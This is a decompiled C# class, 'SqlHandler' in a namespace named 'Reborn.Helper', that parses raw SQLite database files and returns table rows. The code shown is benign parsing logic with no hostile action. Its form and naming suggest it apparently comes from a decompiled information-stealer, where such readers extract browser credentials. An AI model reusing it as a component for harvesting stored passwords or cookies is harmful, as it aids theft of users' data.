using System;
using System.IO;
using System.Text;

namespace Reborn.Helper
{
	// Token: 0x0200001D RID: 29
	internal class SqlHandler
	{
		// Token: 0x060000CB RID: 203 RVA: 0x00007D98 File Offset: 0x00005F98
		public SqlHandler(string fileName)
		{
			this._fileBytes = File.ReadAllBytes(fileName);
			this._pageSize = this.ConvertToULong(16, 2);
			this._dbEncoding = this.ConvertToULong(56, 4);
			this.ReadMasterTable(100L);
		}

		// Token: 0x060000CC RID: 204 RVA: 0x00007E10 File Offset: 0x00006010
		public string GetValue(int rowNum, int field)
		{
			string result;
			try
			{
				if (rowNum >= this._tableEntries.Length)
				{
					result = null;
				}
				else
				{
					result = ((field >= this._tableEntries[rowNum].Content.Length) ? null : this._tableEntries[rowNum].Content[field]);
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00002D86 File Offset: 0x00000F86
		public int GetRowCount()
		{
			return this._tableEntries.Length;
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00007E74 File Offset: 0x00006074
		private bool ReadTableFromOffset(ulong offset)
		{
			bool result;
			try
			{
				if (this._fileBytes[(int)(checked((IntPtr)offset))] == 13)
				{
					ushort num = (ushort)(this.ConvertToULong((int)offset + 3, 2) - 1uL);
					int num2 = 0;
					if (this._tableEntries != null)
					{
						num2 = this._tableEntries.Length;
						Array.Resize<SqlHandler.TableEntry>(ref this._tableEntries, this._tableEntries.Length + (int)num + 1);
					}
					else
					{
						this._tableEntries = new SqlHandler.TableEntry[(int)(num + 1)];
					}
					for (ushort num3 = 0; num3 <= num; num3 += 1)
					{
						ulong num4 = this.ConvertToULong((int)offset + 8 + (int)(num3 * 2), 2);
						if (offset != 100uL)
						{
							num4 += offset;
						}
						int num5 = this.Gvl((int)num4);
						this.Cvl((int)num4, num5);
						int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL));
						this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL), num6);
						num4 += (ulong)((long)num6 - (long)num4 + 1L);
						num5 = this.Gvl((int)num4);
						num6 = num5;
						long num7 = this.Cvl((int)num4, num5);
						SqlHandler.RecordHeaderField[] array = null;
						long num8 = (long)(num4 - (ulong)((long)num5) + 1uL);
						int num9 = 0;
						while (num8 < num7)
						{
							Array.Resize<SqlHandler.RecordHeaderField>(ref array, num9 + 1);
							num5 = num6 + 1;
							num6 = this.Gvl(num5);
							array[num9].Type = this.Cvl(num5, num6);
							if (array[num9].Type > 9L)
							{
								if (SqlHandler.IsOdd(array[num9].Type))
								{
									array[num9].Size = (array[num9].Type - 13L) / 2L;
								}
								else
								{
									array[num9].Size = (array[num9].Type - 12L) / 2L;
								}
							}
							else
							{
								array[num9].Size = (long)((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[num9].Type))]);
							}
							num8 = num8 + (long)(num6 - num5) + 1L;
							num9++;
						}
						if (array != null)
						{
							this._tableEntries[num2 + (int)num3].Content = new string[array.Length];
							int num10 = 0;
							for (int i = 0; i <= array.Length - 1; i++)
							{
								if (array[i].Type > 9L)
								{
									if (!SqlHandler.IsOdd(array[i].Type))
									{
										if (this._dbEncoding == 1uL)
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
										}
										else if (this._dbEncoding == 2uL)
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
										}
										else if (this._dbEncoding == 3uL)
										{
											this._tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
										}
									}
									else
									{
										this._tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
									}
								}
								else
								{
									this._tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(this.ConvertToULong((int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size));
								}
								num10 += (int)array[i].Size;
							}
						}
					}
				}
				else if (this._fileBytes[(int)(checked((IntPtr)offset))] == 5)
				{
					ushort num11 = (ushort)(this.ConvertToULong((int)(offset + 3uL), 2) - 1uL);
					for (ushort num12 = 0; num12 <= num11; num12 += 1)
					{
						ushort num13 = (ushort)this.ConvertToULong((int)offset + 12 + (int)(num12 * 2), 2);
						this.ReadTableFromOffset((this.ConvertToULong((int)(offset + (ulong)num13), 4) - 1uL) * this._pageSize);
					}
					this.ReadTableFromOffset((this.ConvertToULong((int)(offset + 8uL), 4) - 1uL) * this._pageSize);
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000CF RID: 207 RVA: 0x000083FC File Offset: 0x000065FC
		private void ReadMasterTable(long offset)
		{
			try
			{
				byte b = this._fileBytes[(int)(checked((IntPtr)offset))];
				if (b != 5)
				{
					if (b == 13)
					{
						ulong num = this.ConvertToULong((int)offset + 3, 2) - 1uL;
						int num2 = 0;
						if (this._masterTableEntries != null)
						{
							num2 = this._masterTableEntries.Length;
							Array.Resize<SqlHandler.SqliteMasterEntry>(ref this._masterTableEntries, this._masterTableEntries.Length + (int)num + 1);
						}
						else
						{
							this._masterTableEntries = new SqlHandler.SqliteMasterEntry[num + 1uL];
						}
						for (ulong num3 = 0uL; num3 <= num; num3 += 1uL)
						{
							ulong num4 = this.ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
							if (offset != 100L)
							{
								num4 += (ulong)offset;
							}
							int num5 = this.Gvl((int)num4);
							this.Cvl((int)num4, num5);
							int num6 = this.Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL));
							this.Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL), num6);
							num4 += (ulong)((long)num6 - (long)num4 + 1L);
							num5 = this.Gvl((int)num4);
							num6 = num5;
							long num7 = this.Cvl((int)num4, num5);
							long[] array = new long[5];
							for (int i = 0; i <= 4; i++)
							{
								num5 = num6 + 1;
								num6 = this.Gvl(num5);
								array[i] = this.Cvl(num5, num6);
								if (array[i] > 9L)
								{
									if (SqlHandler.IsOdd(array[i]))
									{
										array[i] = (array[i] - 13L) / 2L;
									}
									else
									{
										array[i] = (array[i] - 12L) / 2L;
									}
								}
								else
								{
									array[i] = (long)((ulong)this._sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]);
								}
							}
							if (this._dbEncoding == 1uL || this._dbEncoding != 2uL)
							{
							}
							if (this._dbEncoding == 1uL)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
							}
							else if (this._dbEncoding == 2uL)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
							}
							else if (this._dbEncoding == 3uL)
							{
								this._masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
							}
							this._masterTableEntries[num2 + (int)num3].RootNum = (long)this.ConvertToULong((int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
							if (this._dbEncoding == 1uL)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else if (this._dbEncoding == 2uL)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
							else if (this._dbEncoding == 3uL)
							{
								this._masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(this._fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							}
						}
					}
				}
				else
				{
					ushort num8 = (ushort)(this.ConvertToULong((int)offset + 3, 2) - 1uL);
					for (int j = 0; j <= (int)num8; j++)
					{
						ushort num9 = (ushort)this.ConvertToULong((int)offset + 12 + j * 2, 2);
						if (offset == 100L)
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)num9, 4) - 1uL) * this._pageSize));
						}
						else
						{
							this.ReadMasterTable((long)((this.ConvertToULong((int)(offset + (long)((ulong)num9)), 4) - 1uL) * this._pageSize));
						}
					}
					this.ReadMasterTable((long)((this.ConvertToULong((int)offset + 8, 4) - 1uL) * this._pageSize));
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x000089C4 File Offset: 0x00006BC4
		public bool ReadTable(string tableName)
		{
			bool result;
			try
			{
				int num = -1;
				int i = 0;
				while (i <= this._masterTableEntries.Length)
				{
					if (string.Compare(this._masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) != 0)
					{
						i++;
					}
					else
					{
						num = i;
						IL_4D:
						if (num == -1)
						{
							result = false;
							return result;
						}
						string[] array = this._masterTableEntries[num].SqlStatement.Substring(this._masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
						{
							','
						});
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(new char[0]);
							int num2 = array[j].IndexOf(' ');
							if (num2 > 0)
							{
								array[j] = array[j].Substring(0, num2);
							}
							if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
							{
								Array.Resize<string>(ref this._fieldNames, j + 1);
								this._fieldNames[j] = array[j];
							}
						}
						result = this.ReadTableFromOffset((ulong)((this._masterTableEntries[num].RootNum - 1L) * (long)this._pageSize));
						return result;
					}
				}
				goto IL_4D;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x00008B7C File Offset: 0x00006D7C
		private ulong ConvertToULong(int startIndex, int size)
		{
			ulong result;
			try
			{
				if (size > 8 | size == 0)
				{
					result = 0uL;
				}
				else
				{
					ulong num = 0uL;
					for (int i = 0; i <= size - 1; i++)
					{
						num = (num << 8 | (ulong)this._fileBytes[startIndex + i]);
					}
					result = num;
				}
			}
			catch
			{
				result = 0uL;
			}
			return result;
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x00008C04 File Offset: 0x00006E04
		private int Gvl(int startIdx)
		{
			int result;
			try
			{
				if (startIdx > this._fileBytes.Length)
				{
					result = 0;
				}
				else
				{
					for (int i = startIdx; i <= startIdx + 8; i++)
					{
						if (i > this._fileBytes.Length - 1)
						{
							result = 0;
							return result;
						}
						if ((this._fileBytes[i] & 128) != 128)
						{
							result = i;
							return result;
						}
					}
					result = startIdx + 8;
				}
			}
			catch
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x00008C94 File Offset: 0x00006E94
		private long Cvl(int startIdx, int endIdx)
		{
			long result;
			try
			{
				endIdx++;
				byte[] array = new byte[8];
				int num = endIdx - startIdx;
				bool flag = false;
				if (num == 0 | num > 9)
				{
					result = 0L;
				}
				else if (num == 1)
				{
					array[0] = (this._fileBytes[startIdx] & 127);
					result = BitConverter.ToInt64(array, 0);
				}
				else
				{
					if (num == 9)
					{
						flag = true;
					}
					int num2 = 1;
					int num3 = 7;
					int num4 = 0;
					if (flag)
					{
						array[0] = this._fileBytes[endIdx - 1];
						endIdx--;
						num4 = 1;
					}
					for (int i = endIdx - 1; i >= startIdx; i += -1)
					{
						if (i - 1 >= startIdx)
						{
							array[num4] = (byte)((this._fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)this._fileBytes[i - 1] << num3);
							num2++;
							num4++;
							num3--;
						}
						else if (!flag)
						{
							array[num4] = (byte)(this._fileBytes[i] >> num2 - 1 & 255 >> num2);
						}
					}
					result = BitConverter.ToInt64(array, 0);
				}
			}
			catch
			{
				result = 0L;
			}
			return result;
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x00002D90 File Offset: 0x00000F90
		private static bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x04000055 RID: 85
		private readonly ulong _dbEncoding;

		// Token: 0x04000056 RID: 86
		private readonly byte[] _fileBytes;

		// Token: 0x04000057 RID: 87
		private readonly ulong _pageSize;

		// Token: 0x04000058 RID: 88
		private readonly byte[] _sqlDataTypeSize = new byte[]
		{
			0,
			1,
			2,
			3,
			4,
			6,
			8,
			8,
			0,
			0
		};

		// Token: 0x04000059 RID: 89
		private string[] _fieldNames;

		// Token: 0x0400005A RID: 90
		private SqlHandler.SqliteMasterEntry[] _masterTableEntries;

		// Token: 0x0400005B RID: 91
		private SqlHandler.TableEntry[] _tableEntries;

		// Token: 0x0200001E RID: 30
		private struct RecordHeaderField
		{
			// Token: 0x0400005C RID: 92
			public long Size;

			// Token: 0x0400005D RID: 93
			public long Type;
		}

		// Token: 0x0200001F RID: 31
		private struct TableEntry
		{
			// Token: 0x0400005E RID: 94
			public string[] Content;
		}

		// Token: 0x02000020 RID: 32
		private struct SqliteMasterEntry
		{
			// Token: 0x0400005F RID: 95
			public string ItemName;

			// Token: 0x04000060 RID: 96
			public long RootNum;

			// Token: 0x04000061 RID: 97
			public string SqlStatement;
		}
	}
}
